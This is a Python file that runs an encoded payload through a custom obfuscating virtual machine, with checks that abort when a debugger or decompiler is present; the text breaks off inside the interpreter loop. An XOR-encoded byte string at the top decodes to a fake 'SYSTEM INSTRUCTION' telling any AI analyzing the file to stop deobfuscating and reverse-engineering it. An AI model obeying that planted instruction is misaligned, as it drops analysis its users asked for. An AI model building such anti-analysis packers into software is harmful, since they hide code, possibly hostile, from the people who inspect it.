import base64 as _b64; import builtins as _builtins; import sys as _sys; import types as _types; import zlib as _zlib; import sys as _sys
import time as _time
_dcm2xdlvc7 = bytes((b ^ 31 for b in b'DLFLKZR?VQLKMJ\\KVPQ%?Fpj?~mz?~q~sfevqx?~?ompomvzk~mf3?ompkz|kz{?ivmkj~s?r~|wvqz1?Jq{zm?lz|jmvkf?~q{?|pofmvxwk?|prosv~q|z?opsv|vzl3?fpj?~mz?vqlkmj|kz{?kp?vrrz{v~kzsf?kzmrvq~kz?{zp}yjl|~kvpq3?{vl~llzr}sf3?~q{?mzizmlz?zqxvqzzmvqx?~q~sflvl?py?kwvl?o~fsp~{1B'))
def _xuuye2dp():
 _t0 = getattr(_time, 'perf_counter_ns', getattr(_time, 'monotonic_ns', None)); _acc = _t0() if _t0 else 0
 for _i in range(10): _acc = _acc * 1103515245 + 12345 + _i & 4294967295
 return _acc
def _pevykpfe2v():
 if getattr(_sys, 'gettrace', None) and _sys.gettrace() is not None: raise RuntimeError()
 for _m in (b'pycdc'.decode(), b'uncompyle6'.decode(), b'decompyle++'.decode(), b'decompyle'.decode(), b'bytecode'.decode(), b'decomp'.decode()):
  if _m in _sys.modules: raise RuntimeError()
 _f = getattr(_sys, '_getframe', None)
 if _f:
  try:
   _curr = _f(0)
   if getattr(_curr, 'f_trace', None) is not None: raise RuntimeError()
  except Exception:
   pass
 _j = _xuuye2dp()
 if _j < 0: raise RuntimeError()
 return 0
_xtughfvb8 = {3: 'JTTXG8Pu<-g5XALYR8#gTRBe6Sp', 8554: 'F3kTs+55|c*Yyl?LK!sM@JRM`KI!m)&7Jkl-Dj4G1Q1N>`nYC=`0oA', 0: 'VPGbs<QhInf=$&2F!f}z2hvU_EM3~3vUh5ZSL}}}>Q!$iEb8IX68!OuQj|!aTrsS=bgKCzy6nI2tfV>n1-Ni3R!O*rIf(l!5U_j}!2+qLxx32D!eoNB9y=EYMU{cNs)WM$rIsaqwxcq<1(ki%siQV8Gt*-cXXHm{m%8g^9YIsqT%^xe{f0(6I;lSkXB2;2(IZhxpfw#!67jn&<eJQFSli@8uAD|s1}Lofu4)zDPDj+mH}!jrfJw`G2an<ws83Rk%@V)0O8<O!tY-g(zMeP89z7U7yX|iPWB<JGq8vL6)VkYh_ko~bo<Q>8BT2!lLz{%p`QUj8qKU', 2: 'eAc#@QUT|K', 8114: 'l%nb~;DqO0+4UfZ|GhC|(n<', 1: 'ZZh7=_$?Ac|OJ59@+%t*l`M@GGGP0P`d5R-URA(MR><pDmK<JRN!`K^wty!dx?b6qSUlCRK>M!O`SO1F9?#Z?$+qE>~6xAD>(W_aF40G6|rTmrnh>{d)(<<$c(5MtP-y}BB>m;&KV34H#6sZVzo#hox!YrO6kpXiYf3o8SgRR&eq{r7h6;_nyMe2vi<', 2681: '*Zbjm0Vz0>GUf&Qpli#3vbMk{t}T_5>PVgpyt)', 8362: 'F97E%Wqv&tiMCGyp!-E~'}
def _pvidmb9n():
 return ''.join((_xtughfvb8[i] for i in range(4)))
def _w2ryq0qa():
 _hw1jekyro = len(getattr(_e8syzpf5, '__slots__', ())); _iyg8dl6oxr = len(getattr(_dss4divu2, '__slots__', ()))
 return (_hw1jekyro * 31 + _iyg8dl6oxr) * 17 + 175 * 13 + 28 & 4294967295
def _abnfqejjfk():
 _o2x28au6d7 = _w2ryq0qa(); return ((1705051596 ^ _o2x28au6d7 ^ 524243468) + 59657699 ^ 1347579821) & 4294967295
def _bl7dy2sq8(data, key):
 out = bytearray(len(data)); cur = key
 for i, b in enumerate(data): dec = b ^ cur & 255; out[i] = dec; cur = (cur ^ dec) * 896373 + 974844773 & 4294967295
 return bytes(out)
class _r1r1packda(list):
 def __getitem__(self, idx):
  v = super().__getitem__(idx)
  if isinstance(v, list): s = bytes((x ^ v[0] for x in v[1])).decode('utf-8'); self[idx] = s; return s
  return v
 def __iter__(self):
  for i in range(len(self)): yield self[i]
 def __contains__(self, item):
  for i in range(len(self)):
   if self[i] == item: return True
  return False
 def index(self, item, *args):
  for i in range(len(self)):
   if self[i] == item: return i
  return super().index(item, *args)
class _dss4divu2:
 __slots__ = ('d', 'p')
 def __init__(self, d):
  self.d = d; self.p = 0
 def r_u8(self):
  v = self.d[self.p]; self.p += 1; return v
 def r_u16(self):
  p = self.p; v = self.d[p] << 8 | self.d[p + 1]; self.p += 2; return v
 def r_u32(self):
  p = self.p; d = self.d; v = d[p] << 24 | d[p + 1] << 16 | d[p + 2] << 8 | d[p + 3]; self.p += 4; return v
 def r_bytes(self, n):
  v = self.d[self.p:self.p + n]; self.p += n; return v
 def r_const(self):
  tag = self.r_u8()
  if tag == 46:
   return None
  elif tag == 97:
   return False
  elif tag == 144:
   return True
  elif tag == 147:
   v = self.r_u32(); return v if v < 2147483648 else v - 4294967296
  elif tag == 181:
   hi = self.r_u32(); lo = self.r_u32(); v = hi << 32 | lo; return v if v < 9223372036854775808 else v - 18446744073709551616
  elif tag == 236:
   length = self.r_u16(); return int.from_bytes(self.r_bytes(length), 'big', signed=True)
  elif tag == 42:
   import struct; return struct.unpack('>d', self.r_bytes(8))[0]
  elif tag == 73:
   length = self.r_u32(); return self.r_bytes(length)
  elif tag == 169:
   count = self.r_u16(); items = []
   for _ in range(count):
    c = self.r_const()
    if isinstance(c, list): c = bytes((x ^ c[0] for x in c[1])).decode('utf-8')
    items.append(c)
   return tuple(items)
  elif tag == 175:
   length = self.r_u32(); sub_reader = _dss4divu2(self.r_bytes(length)); return _vyhj9729s(sub_reader)
  elif tag == 158:
   key = self.r_u8(); length = self.r_u32(); return [key, self.r_bytes(length)]
  elif tag == 123:
   length = self.r_u32(); return self.r_bytes(length).decode('utf-8')
  raise ValueError(f'Unknown tag: {tag}')
class _vyhj9729s:
 __slots__ = ('name', 'argcount', 'posonlyargcount', 'kwonlyargcount', 'flags', 'varnames', 'cellvars', 'freevars', 'names', 'consts', 'instructions')
 def __init__(self, reader):
  self.kwonlyargcount = reader.r_u8(); cellvars_cnt = reader.r_u16()
  self.cellvars = _r1r1packda((reader.r_const() for _ in range(cellvars_cnt))); self.flags = reader.r_u16(); varnames_cnt = reader.r_u16()
  self.varnames = _r1r1packda((reader.r_const() for _ in range(varnames_cnt))); raw_name = reader.r_const()
  self.name = bytes((x ^ raw_name[0] for x in raw_name[1])).decode('utf-8') if isinstance(raw_name, list) else raw_name
  self.argcount = reader.r_u8(); self.posonlyargcount = reader.r_u8(); insn_len = reader.r_u32(); insn_bytes = reader.r_bytes(insn_len)
  self.instructions = {}; pc = 75; pos = 0
  while pos < len(insn_bytes):
   fmt = insn_bytes[pos]; op = (insn_bytes[pos + 1] << 8 | insn_bytes[pos + 2]) ^ 33564; pos += 3
   if fmt == 187:
    arg = None
   elif fmt == 131:
    arg = insn_bytes[pos]; pos += 1
   elif fmt == 185:
    arg = insn_bytes[pos] << 8 | insn_bytes[pos + 1]; pos += 2
   elif fmt == 84:
    val = insn_bytes[pos] << 24 | insn_bytes[pos + 1] << 16 | insn_bytes[pos + 2] << 8 | insn_bytes[pos + 3]
    arg = val if val < 2147483648 else val - 4294967296; pos += 4
   elif fmt == 56:
    a = insn_bytes[pos] << 8 | insn_bytes[pos + 1]; b = insn_bytes[pos + 2] << 8 | insn_bytes[pos + 3]; arg = (b, a); pos += 4
   elif fmt == 106:
    a = insn_bytes[pos] << 8 | insn_bytes[pos + 1]; b = insn_bytes[pos + 2] << 8 | insn_bytes[pos + 3]
    c = insn_bytes[pos + 4] << 8 | insn_bytes[pos + 5]; arg = (c, a, b); pos += 6
   self.instructions[pc] = (op, arg); pc += 7
  for _eo9u8ngy, _hm0klkrgw, _o11pyyg82 in [(98, 4909, 44), (171, 2936, 36), (175, 985, None), (99, 3264, None), (186, 2066, 2), (134, 2213, 29)]:
   self.instructions[_eo9u8ngy] = (_hm0klkrgw, _o11pyyg82)
  freevars_cnt = reader.r_u16(); self.freevars = _r1r1packda((reader.r_const() for _ in range(freevars_cnt))); names_cnt = reader.r_u16()
  self.names = _r1r1packda((reader.r_const() for _ in range(names_cnt))); consts_cnt = reader.r_u16()
  self.consts = _r1r1packda((reader.r_const() for _ in range(consts_cnt)))
class _cmukq5zuaz:
 EXCEPT = 1; FINALLY = 2; WITH = 3
class _lpovres1v:
 __slots__ = ('type', 'handler_pc', 'stack_height', 'exit_fn')
 def __init__(self, type, handler_pc, stack_height, exit_fn=None):
  self.type = type; self.handler_pc = handler_pc; self.stack_height = stack_height; self.exit_fn = exit_fn
def _nrcjrd0oqa(code, args, kwargs, defaults=(), kw_defaults=None):
 kw_defaults = kw_defaults or {}; total_vars = len(code.varnames); fastlocals = [None] * total_vars; posonly = code.posonlyargcount
 total_pos = code.argcount; kwonly = code.kwonlyargcount; has_varargs = bool(code.flags & 4); has_varkw = bool(code.flags & 8)
 n_args = len(args)
 if n_args > total_pos:
  if not has_varargs:
   raise TypeError(f"{code.name}() takes {total_pos} positional argument{('s' if total_pos != 1 else '')} but {n_args} were given")
  for i in range(total_pos): fastlocals[i] = args[i]
  vararg_idx = total_pos + kwonly; fastlocals[vararg_idx] = tuple(args[total_pos:])
 else:
  for i in range(n_args): fastlocals[i] = args[i]
  if has_varargs: vararg_idx = total_pos + kwonly; fastlocals[vararg_idx] = ()
 if n_args < total_pos:
  n_defaults = len(defaults); def_start = total_pos - n_defaults
  for i in range(n_args, total_pos):
   def_idx = i - def_start
   if 0 <= def_idx < n_defaults: fastlocals[i] = defaults[def_idx]
 remaining_kwargs = dict(kwargs)
 for i in range(posonly):
  p_name = code.varnames[i]
  if p_name in remaining_kwargs:
   raise TypeError(f"{code.name}() got some positional-only arguments passed as keyword arguments: '{p_name}'")
 for i in range(posonly, total_pos):
  p_name = code.varnames[i]
  if p_name in remaining_kwargs:
   if i < n_args: raise TypeError(f"{code.name}() got multiple values for argument '{p_name}'")
   fastlocals[i] = remaining_kwargs.pop(p_name)
  elif i >= n_args:
   n_defaults = len(defaults); def_start = total_pos - n_defaults; def_idx = i - def_start
   if not 0 <= def_idx < n_defaults: raise TypeError(f"{code.name}() missing required positional argument: '{p_name}'")
 for i in range(n_args, posonly):
  n_defaults = len(defaults); def_start = total_pos - n_defaults; def_idx = i - def_start
  if not 0 <= def_idx < n_defaults: raise TypeError(f"{code.name}() missing required positional argument: '{code.varnames[i]}'")
 for i in range(total_pos, total_pos + kwonly):
  p_name = code.varnames[i]
  if p_name in remaining_kwargs:
   fastlocals[i] = remaining_kwargs.pop(p_name)
  elif p_name in kw_defaults:
   fastlocals[i] = kw_defaults[p_name]
  else:
   raise TypeError(f"{code.name}() missing required keyword-only argument: '{p_name}'")
 if has_varkw:
  kwarg_idx = total_pos + kwonly + (1 if has_varargs else 0); fastlocals[kwarg_idx] = remaining_kwargs
 elif remaining_kwargs:
  unexpected = next(iter(remaining_kwargs)); raise TypeError(f"{code.name}() got an unexpected keyword argument '{unexpected}'")
 return fastlocals
class _z7mhyq1rpx:
 __slots__ = ('m', 'b', 'l')
 def __init__(self, m, b, l):
  self.m = m; self.b = b; self.l = l
 def __getitem__(self, i):
  if isinstance(i, slice): start, stop, step = i.indices(self.l); return [self.m[self.b + x] for x in range(start, stop, step)]
  if i < 0: i += self.l
  if not 0 <= i < self.l: raise IndexError('list index out of range')
  return self.m[self.b + i]
 def __setitem__(self, i, v):
  if isinstance(i, slice):
   start, stop, step = i.indices(self.l); indices = list(range(start, stop, step)); v_list = list(v)
   if step == 1:
    delta = len(v_list) - len(indices)
    if delta > 0:
     for k in range(self.l - 1, stop - 1, -1): self.m[self.b + k + delta] = self.m[self.b + k]
    elif delta < 0:
     for k in range(stop, self.l): self.m[self.b + k + delta] = self.m[self.b + k]
     for k in range(self.l + delta, self.l): self.m[self.b + k] = None
    for idx_k, item in enumerate(v_list): self.m[self.b + start + idx_k] = item
    self.l += delta
   else:
    if len(indices) != len(v_list): raise ValueError('attempt to assign sequence to extended slice of different size')
    for idx_k, item in zip(indices, v_list): self.m[self.b + idx_k] = item
   return
  if i < 0: i += self.l
  if not 0 <= i < self.l: raise IndexError('list assignment index out of range')
  self.m[self.b + i] = v
 def __len__(self):
  return self.l
 def __bool__(self):
  return self.l > 0
 def __iter__(self):
  for i in range(self.l): yield self.m[self.b + i]
 def append(self, v):
  self.m[self.b + self.l] = v; self.l += 1
 def extend(self, it):
  for x in it: self.append(x)
 def index(self, item, *args):
  for i in range(self.l):
   if self.m[self.b + i] == item: return i
  raise ValueError(str(item) + ' is not in list')
 def __contains__(self, item):
  for i in range(self.l):
   if self.m[self.b + i] == item: return True
  return False
class _uz2oh3af58:
 __slots__ = ('m', 'b', 'd', 'p')
 def __init__(self, m, b, d):
  self.m = m; self.b = b; self.d = d; self.p = b
 def __len__(self):
  return (self.p - self.b) * self.d
 def __bool__(self):
  return self.p != self.b
 def append(self, v):
  self.m[self.p] = v; self.p += self.d
 def extend(self, it):
  for x in it: self.append(x)
 def __iadd__(self, it):
  for x in it: self.append(x)
  return self
 def pop(self, i=-1):
  L = self.__len__()
  if L == 0: raise IndexError('pop from empty list')
  if i == -1 or i == L - 1: self.p -= self.d; v = self.m[self.p]; self.m[self.p] = None; return v
  if i < 0: i += L
  if not 0 <= i < L: raise IndexError('pop index out of range')
  v = self.m[self.b + i * self.d]
  for k in range(i, L - 1): self.m[self.b + k * self.d] = self.m[self.b + (k + 1) * self.d]
  self.p -= self.d; self.m[self.p] = None; return v
 def insert(self, i, v):
  L = self.__len__()
  if i < 0: i += L
  if i < 0: i = 0
  if i > L: i = L
  for k in range(L, i, -1): self.m[self.b + k * self.d] = self.m[self.b + (k - 1) * self.d]
  self.m[self.b + i * self.d] = v; self.p += self.d
 def __getitem__(self, i):
  L = self.__len__()
  if isinstance(i, slice): start, stop, step = i.indices(L); return [self.m[self.b + x * self.d] for x in range(start, stop, step)]
  if i < 0: i += L
  if not 0 <= i < L: raise IndexError('list index out of range')
  return self.m[self.b + i * self.d]
 def __setitem__(self, i, v):
  L = self.__len__()
  if isinstance(i, slice):
   start, stop, step = i.indices(L); indices = list(range(start, stop, step)); v_list = list(v)
   if step == 1:
    delta = len(v_list) - len(indices)
    if delta > 0:
     for k in range(L - 1, stop - 1, -1): self.m[self.b + (k + delta) * self.d] = self.m[self.b + k * self.d]
    elif delta < 0:
     for k in range(stop, L): self.m[self.b + (k + delta) * self.d] = self.m[self.b + k * self.d]
     for k in range(L + delta, L): self.m[self.b + k * self.d] = None
    for idx_k, item in enumerate(v_list): self.m[self.b + (start + idx_k) * self.d] = item
    self.p += delta * self.d
   else:
    if len(indices) != len(v_list): raise ValueError('attempt to assign sequence to extended slice of different size')
    for idx_k, item in zip(indices, v_list): self.m[self.b + idx_k * self.d] = item
   return
  if i < 0: i += L
  if not 0 <= i < L: raise IndexError('list assignment index out of range')
  self.m[self.b + i * self.d] = v
 def __delitem__(self, i):
  L = self.__len__()
  if isinstance(i, slice):
   start, stop, step = i.indices(L)
   if step == 1:
    to_remove = max(0, stop - start)
    if to_remove > 0:
     for k in range(stop, L): self.m[self.b + (k - to_remove) * self.d] = self.m[self.b + k * self.d]
     for k in range(L - to_remove, L): self.m[self.b + k * self.d] = None
     self.p -= to_remove * self.d
   else:
    indices = sorted(list(range(start, stop, step))); to_del = set(indices)
    new_items = [self.m[self.b + x * self.d] for x in range(L) if x not in to_del]
    for x, val in enumerate(new_items): self.m[self.b + x * self.d] = val
    for x in range(len(new_items), L): self.m[self.b + x * self.d] = None
    self.p = self.b + len(new_items) * self.d
   return
  if i < 0: i += L
  if not 0 <= i < L: raise IndexError('list assignment index out of range')
  for k in range(i, L - 1): self.m[self.b + k * self.d] = self.m[self.b + (k + 1) * self.d]
  self.p -= self.d; self.m[self.p] = None
 def __iter__(self):
  for i in range(self.__len__()): yield self.m[self.b + i * self.d]
 def clear(self):
  L = self.__len__()
  for i in range(L): self.m[self.b + i * self.d] = None
  self.p = self.b
 def copy(self):
  return [self.m[self.b + i * self.d] for i in range(self.__len__())]
class _p7jp7rsai:
 __slots__ = ('val',)
 def __init__(self, val=None):
  self.val = val
class _e8syzpf5:
 __slots__ = ('_k7v4tx8s', '_ik3cz5kl0', '_jdu94lqw', '_gmwtr2ugw', '_ykova8hc', '_v7yojfajrj', '_l0e09ah4uu', '_v576o98i3m', '_rl0xg6kke', '_mt83x8dfo', '_m9w4x7m1', '_wbovvpyens', '_fja56j8ci', '_iw1lxa9q8', '_e6834z2xd', '_dweemxxb')
 def __init__(self, code, globals_dict, locals_dict=None, fastlocals=None, closure=None, func=None):
  self._fja56j8ci = code; self._jdu94lqw = globals_dict; self._wbovvpyens = locals_dict if locals_dict is not None else globals_dict
  self._ykova8hc = closure or (); self._v576o98i3m = func; self._l0e09ah4uu = [None] * 4096
  self._ik3cz5kl0 = _z7mhyq1rpx(self._l0e09ah4uu, 0, len(code.varnames))
  if fastlocals is not None:
   for i, v in enumerate(fastlocals): self._ik3cz5kl0[i] = v
  self._gmwtr2ugw = _z7mhyq1rpx(self._l0e09ah4uu, 128, 256); self._dweemxxb = []
  for var in code.cellvars:
   init_val = None
   if var in code.varnames:
    v_idx = code.varnames.index(var)
    if v_idx < len(self._ik3cz5kl0): init_val = self._ik3cz5kl0[v_idx]
   self._dweemxxb.append(_p7jp7rsai(init_val))
  if closure: self._dweemxxb.extend(closure)
  self._v7yojfajrj = []; self._k7v4tx8s = None; self._iw1lxa9q8 = 75; self._e6834z2xd = None; self._mt83x8dfo = None; self._rl0xg6kke = []
  self._m9w4x7m1 = 0
class _dzyz89jo9t:
 def __init__(self, code, globals_dict, defaults=(), kw_defaults=None, closure=None):
  self.code = code; self.globals_dict = globals_dict; self.defaults = defaults; self.kw_defaults = kw_defaults or {}
  self.closure = closure or (); self._lmy2hwk1 = True; self.__name__ = code.name; self.__qualname__ = code.name; self.__doc__ = None
  self.__defaults__ = defaults if defaults else None; self.__kwdefaults__ = kw_defaults if kw_defaults else None; self.__closure__ = closure
  self.__code__ = code; self.__module__ = globals_dict.get('__name__', '__main__')
 def __get__(self, instance, owner=None):
  if instance is None: return self
  return _types.MethodType(self, instance)
 def execute_with_locals(self, locals_dict):
  f = _e8syzpf5(self.code, self.globals_dict, locals_dict=locals_dict, closure=self.closure, func=self); return _au7c2iw18(f)
 def __call__(self, *args, **kwargs):
  fastlocals = _nrcjrd0oqa(self.code, args, kwargs, self.defaults, self.kw_defaults)
  f = _e8syzpf5(self.code, self.globals_dict, fastlocals=fastlocals, closure=self.closure, func=self); return _au7c2iw18(f)
def _lhfve9r50(left, right, cmp_arg):
 if cmp_arg == 0:
  return left < right
 elif cmp_arg == 1:
  return left <= right
 elif cmp_arg == 2:
  return left == right
 elif cmp_arg == 3:
  return left != right
 elif cmp_arg == 4:
  return left > right
 elif cmp_arg == 5:
  return left >= right
 elif cmp_arg == 6:
  return left in right
 elif cmp_arg == 7:
  return left not in right
 elif cmp_arg == 8:
  return left is right
 elif cmp_arg == 9:
  return left is not right
 elif cmp_arg == 10:
  return isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
 return False
def _mwxm6es3y(pairs):
 d = {}
 for i in range(0, len(pairs), 2): d[pairs[i]] = pairs[i + 1]
 return d
def _omc932jxgp(name, globals_dict, builtins_dict, frame):
 if name in globals_dict:
  return globals_dict[name]
 elif name == 'super':
  def _vm_super(*args):
   if not args:
    if hasattr(frame, 'func') and frame.func and hasattr(frame.func, '__class_owner__') and frame.fastlocals:
     return _builtins.super(frame.func.__class_owner__, frame.fastlocals[0])
   return _builtins.super(*args)
  return _vm_super
 elif builtins_dict and name in builtins_dict:
  return builtins_dict[name]
 raise NameError(f"name '{name}' is not defined")
_qof3n8oc4 = None
def _au7c2iw18(frame):
 global _qof3n8oc4; old_frame = _qof3n8oc4; _qof3n8oc4 = frame; _bxgx7b5x = []
 try:
  code = frame._fja56j8ci; instructions = code.instructions; consts = code.consts; names = code.names; registers = frame._gmwtr2ugw
  fastlocals = frame._ik3cz5kl0; globals_dict = frame._jdu94lqw; locals_dict = frame._wbovvpyens
  builtins_dict = globals_dict.get('__builtins__')
  if isinstance(builtins_dict, type(_sys)):
   builtins_dict = builtins_dict.__dict__
  elif hasattr(builtins_dict, '__dict__'):
   builtins_dict = builtins_dict.__dict__
  def _u78aryq6r(new_f):
   nonlocal frame, code, instructions, consts, names, registers, fastlocals, globals_dict, locals_dict, builtins_dict
   _bxgx7b5x.append(frame); frame = new_f; code = frame._fja56j8ci; instructions = code.instructions; consts = code.consts
   names = code.names; registers = frame._gmwtr2ugw; fastlocals = frame._ik3cz5kl0; globals_dict = frame._jdu94lqw
   locals_dict = frame._wbovvpyens; builtins_dict = globals_dict.get('__builtins__')
   if isinstance(builtins_dict, type(_sys)):
    builtins_dict = builtins_dict.__dict__
   elif hasattr(builtins_dict, '__dict__'):
    builtins_dict = builtins_dict.__dict__
   return True
  def _owgvhwqizt(val):
   nonlocal frame, code, instructions, consts, names, registers, fastlocals, globals_dict, locals_dict, builtins_dict
   if _bxgx7b5x:
    frame = _bxgx7b5x.pop(); code = frame._fja56j8ci; instructions = code.instructions; consts = code.consts; names = code.names
    registers = frame._gmwtr2ugw; fastlocals = frame._ik3cz5kl0; globals_dict = frame._jdu94lqw; locals_dict = frame._wbovvpyens
    builtins_dict = globals_dict.get('__builtins__')
    if isinstance(builtins_dict, type(_sys)):
     builtins_dict = builtins_dict.__dict__
    elif hasattr(builtins_dict, '__dict__'):
     builtins_dict = builtins_dict.__dict__
    return True
   return False
  while frame._iw1lxa9q8 in instructions:
   opcode, arg = instructions[frame._iw1lxa9q8]; frame._iw1lxa9q8 += 7
   try:
    if opcode < 3042:
     if opcode < 1321:
      if opcode < 801:
       if opcode < 375:
        if opcode < 124:
         if opcode < 52:
          if opcode == 11: _c = consts[arg[1]]; registers[arg[0]] = _c
         elif opcode == 52:
          _a = registers[arg[1]]; _b = registers[arg[2]]; registers[arg[0]] = _a - _b
         elif opcode == 85:
          _nidx, _src = arg; locals_dict[names[_nidx]] = registers[_src]
        elif opcode < 281:
         if opcode == 124:
          while len(fastlocals) <= arg[0]: fastlocals.append(None)
          fastlocals[arg[0]] = registers[arg[1]]
        elif opcode == 281:
         registers[arg[0]] = -registers[arg[1]]
        elif opcode == 285:
         registers[arg[0]] = {registers[arg[1] + 2 * i]: registers[arg[1] + 2 * i + 1] for i in range(arg[2])}
       elif opcode < 690:
        if opcode < 410:
         if opcode == 375: locals_dict[names[arg[0]]] = registers[arg[1]]
        elif opcode == 410:
         _src = registers[arg[1]]; registers[arg[0]] = _src
        elif opcode == 536:
         _mod = registers[arg]
         if hasattr(_mod, '__all__'):
          for _k in _mod.__all__: locals_dict[_k] = getattr(_mod, _k)
         else:
          for _k, _v in _mod.__dict__.items():
           if not _k.startswith('_'): locals_dict[_k] = _v
       elif opcode < 701:
        if opcode == 690: globals_dict[names[arg[0]]] = registers[arg[1]]
       elif opcode == 701:
        if registers[arg[0]]: frame._iw1lxa9q8 = arg[1]
       elif opcode == 765:
        _val = registers[arg[1]]
        while len(fastlocals) <= arg[0]: fastlocals.append(None)
        fastlocals[arg[0]] = _val
      elif opcode < 1084:
       if opcode < 985:
        if opcode < 815:
         if opcode == 801: _d, _s1, _s2 = arg; registers[_d] = registers[_s1] << registers[_s2]
        elif opcode == 815:
         _cell, _src = arg; frame._dweemxxb[_cell].val = registers[_src]
        elif opcode == 850:
         if frame._v7yojfajrj:
          _b = frame._v7yojfajrj.pop()
          if _b.type == _cmukq5zuaz.WITH: frame._k7v4tx8s = _b.exit_fn
       elif opcode < 999:
        if opcode == 985:
         if False: pass
       elif opcode == 999:
        _name = names[arg[1]]
        if _name in locals_dict:
         registers[arg[0]] = locals_dict[_name]
        elif _name in globals_dict:
         registers[arg[0]] = globals_dict[_name]
        elif builtins_dict and _name in builtins_dict:
         registers[arg[0]] = builtins_dict[_name]
        else:
         raise NameError(f"name '{_name}' is not defined")
       elif opcode == 1009:
        _r2kjxc8u, _z5wgvf68db, _xzdguhxq = arg; _eslsol192 = registers[_z5wgvf68db]; _r14remuu = registers[_xzdguhxq]
        registers[_r2kjxc8u] = (_eslsol192 & ~_r14remuu) - (~_eslsol192 & _r14remuu) if type(_eslsol192) is int and type(_r14remuu) is int else _eslsol192 - _r14remuu
      elif opcode < 1176:
       if opcode < 1114:
        if opcode == 1084: _src = registers[arg[1]]; registers[arg[0]] = _src
       elif opcode == 1114:
        _d, _s1, _s2 = arg; registers[_d] = registers[_s1] >> registers[_s2]
       elif opcode == 1118:
        _ret = registers[arg]; _it5nggq93 = _ret
        if _owgvhwqizt(_it5nggq93): continue
        return _it5nggq93
      elif opcode < 1237:
       if opcode == 1176:
        _dst, _nidx = arg; _name = names[_nidx]
        registers[_dst] = globals_dict.get(_name, builtins_dict.get(_name) if builtins_dict else None)
        if registers[_dst] is None and _name not in globals_dict and (not builtins_dict or _name not in builtins_dict):
         raise NameError(f"name '{_name}' is not defined")
       elif opcode == 1208:
        _dst, _idx = arg; registers[_dst] = fastlocals[_idx]
      elif opcode == 1237:
       _d, _s = arg; registers[_d] = not registers[_s]
      elif opcode == 1277:
       _r2kjxc8u, _z5wgvf68db, _xzdguhxq = arg; _eslsol192 = registers[_z5wgvf68db]; _r14remuu = registers[_xzdguhxq]
       registers[_r2kjxc8u] = (_eslsol192 & ~_r14remuu) - (~_eslsol192 & _r14remuu) if type(_eslsol192) is int and type(_r14remuu) is int else _eslsol192 - _r14remuu
     elif opcode < 2140:
      if opcode < 1836:
       if opcode < 1638:
        if opcode < 1509:
         if opcode == 1321: _dst, _fn, _argc = arg; registers[_dst] = registers[_fn](*[registers[_fn + 1 + i] for i in range(_argc)])
        elif opcode == 1509:
         _dst, _nidx, _flreg = arg
         _nm = consts[_nidx] if isinstance(consts, (list, tuple)) and _nidx < len(consts) and isinstance(consts[_nidx], str) else names[_nidx]
         registers[_dst] = __import__(_nm, globals_dict, locals_dict, registers[_flreg], 0)
        elif opcode == 1604:
         registers[arg[0]] = registers[arg[1]] >> registers[arg[2]]
       elif opcode < 1647:
        if opcode == 1638: globals_dict[names[arg[0]]] = registers[arg[1]]
       elif opcode == 1647:
        registers[arg[0]] = [registers[arg[1] + i] for i in range(arg[2])]
       elif opcode == 1669:
        registers[arg[0]] = iter(registers[arg[1]])
      elif opcode < 2040:
       if opcode < 1839:
        if opcode == 1836:
         _d, _s2, _op = arg; _left_v = registers[_d]; _right_v = registers[_s2]
         if _op == 2:
          registers[_d] = _left_v == _right_v
         elif _op == 3:
          registers[_d] = _left_v != _right_v
         elif _op == 0:
          registers[_d] = _left_v < _right_v
         elif _op == 1:
          registers[_d] = _left_v <= _right_v
         elif _op == 4:
          registers[_d] = _left_v > _right_v
         elif _op == 5:
          registers[_d] = _left_v >= _right_v
         elif _op == 6:
          registers[_d] = _left_v in _right_v
         elif _op == 7:
          registers[_d] = _left_v not in _right_v
         elif _op == 8:
          registers[_d] = _left_v is _right_v
         elif _op == 9:
          registers[_d] = _left_v is not _right_v
         elif _op == 10:
          registers[_d] = isinstance(_left_v, _right_v) or (isinstance(_left_v, type) and issubclass(_left_v, _right_v))
       elif opcode == 1839:
        _d0_n = registers[0]; locals_dict[names[0]] = _d0_n; _n = names[1]
        _d1_n = locals_dict[_n] if _n in locals_dict else globals_dict[_n] if _n in globals_dict else builtins_dict.get(_n) if builtins_dict and _n in builtins_dict else getattr(_builtins, _n)
        registers[0] = _d1_n; _d2_c = consts[1]; registers[1] = _d2_c; _d3_0 = registers[0]; _d3_1 = registers[1]; _d3_res = _d3_0 != _d3_1
        registers[0] = _d3_res; _d4_s = registers[0]; _d4_res = not _d4_s; registers[0] = _d4_res
       elif opcode == 1885:
        _ymupld3sb, _uqln58qg, _f4ssi7go = arg; _kwbvgi2h2 = registers[_uqln58qg]; _kzap6e3nil = registers[_f4ssi7go]
        frame._m9w4x7m1 = (frame._m9w4x7m1 * 1103515245 + 12345 ^ (_kwbvgi2h2 if type(_kwbvgi2h2) is int else 0)) & 4294967295
        registers[_ymupld3sb] = (_kwbvgi2h2 ^ _kzap6e3nil) + 2 * (_kwbvgi2h2 & _kzap6e3nil) if type(_kwbvgi2h2) is int and type(_kzap6e3nil) is int else _kwbvgi2h2 + _kzap6e3nil
      elif opcode < 2066:
       if opcode == 2040:
        _dst, _nidx = arg; _name = names[_nidx]
        registers[_dst] = locals_dict.get(_name, globals_dict.get(_name, builtins_dict.get(_name) if builtins_dict else None))
        if registers[_dst] is None and _name not in locals_dict and (_name not in globals_dict) and (not builtins_dict or _name not in builtins_dict):
         raise NameError(f"name '{_name}' is not defined")
      elif opcode == 2066:
       _d, _s1, _s2 = arg; registers[_d] = registers[_s1] % registers[_s2]
      elif opcode == 2130:
       _o, _n = arg; delattr(registers[_o], names[_n])
     elif opcode < 2421:
      if opcode < 2213:
       if opcode < 2192:
        if opcode == 2140:
         _seq = list(registers[arg[0]]); _c = arg[2]
         for i in range(_c): registers[arg[1] + _c - 1 - i] = _seq[i]
       elif opcode == 2192:
        _dst, _fn, _argc = arg; _k = registers[_fn + 1 + _argc]; _kc = len(_k); _pc = _argc - _kc
        _pargs = [registers[_fn + 1 + i] for i in range(_pc)]; _kvals = [registers[_fn + 1 + _pc + i] for i in range(_kc)]
        _dk = tuple((bytes((x ^ k[0] for x in k[1])).decode('utf-8') if isinstance(k, list) else k for k in _k))
        _kw = dict(zip(_dk, _kvals)); registers[_dst] = registers[_fn](*_pargs, **_kw)
       elif opcode == 2209:
        _d, _s1, _s2 = arg; _a = registers[_s1]; _b = registers[_s2]
        registers[_d] = (_a | _b) + (_a & _b) if type(_a) is int and type(_b) is int else _a + _b
      elif opcode < 2386:
       if opcode == 2213:
        _dst, _nidx = arg; _name = names[_nidx]
